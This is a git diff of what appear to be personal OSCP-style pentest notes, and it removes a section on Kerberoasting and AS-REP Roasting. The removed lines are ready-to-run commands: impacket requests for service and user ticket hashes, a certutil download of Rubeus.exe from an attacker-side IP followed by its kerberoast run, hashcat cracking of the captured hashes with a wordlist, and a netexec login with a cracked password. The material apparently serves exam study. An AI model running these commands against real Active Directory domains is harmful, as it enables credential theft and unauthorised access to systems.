@@ -694,35 +694,7 @@ git diff <commit hash>
 
 
 
-### Kerberoasting
 
-```jsx
-sudo impacket-GetUserSPNs -request -dc-ip 10.10.137.146 oscp.exam/web_svc
-```
-
-```jsx
-certutil -urlcache -split -f http://192.168.45.214/Rubeus.exe
-.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
-type hashes.kerberoast
-```
-
-```jsx
-sudo hashcat -m 13100 sql_svc.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
-```
-
-```jsx
-netexec smb 192.168.204.187 -u svc_mssql -p trustno1
-```
-
-### AS-REP Roasting
-
-```jsx
-impacket-GetNPUsers -dc-ip 192.168.50.70 -request -outputfile hashes.asreproast corp.com/pete
-```
-
-```jsx
-sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
-```
 
 ### ACLs
 
